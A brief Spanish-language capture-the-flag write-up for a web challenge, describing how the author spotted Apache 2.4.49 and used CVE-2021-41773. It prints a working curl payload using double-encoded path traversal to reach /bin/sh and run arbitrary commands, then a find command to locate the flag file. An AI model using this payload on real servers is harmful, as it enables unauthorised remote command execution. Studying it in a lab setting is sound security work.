# web01 #

- **Tipo:** Web
- **Autor:** Deloitte
- **Autor del Writeup:** [focab0r](https://github.com/focab0r)
- **Flag:** `?`

## WriteUp ##

Tras enumeraciones de directorios sin exito, interceptamos la peticion a la pagina y vemos que se trata de un servidor que ejecuta `Apache 2.4.49`. Tras una busqueda por internet, encontramos que esa version es vulnerable a un RCE, y buscamos un [PoC](https://github.com/mr-exo/CVE-2021-41773) para su ejecucion:
```
curl 'http://IP:PORT/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; COMANDO'
```
Sin embargo, "flag.txt" no se encuentra en la raiz "/". Esto tiene facil solucion, ya que con el comando `find / -iname flag.txt` buscamos el archivo en el arbol de directorios. Con "flag.txt" encontrado, hallamos la flag.
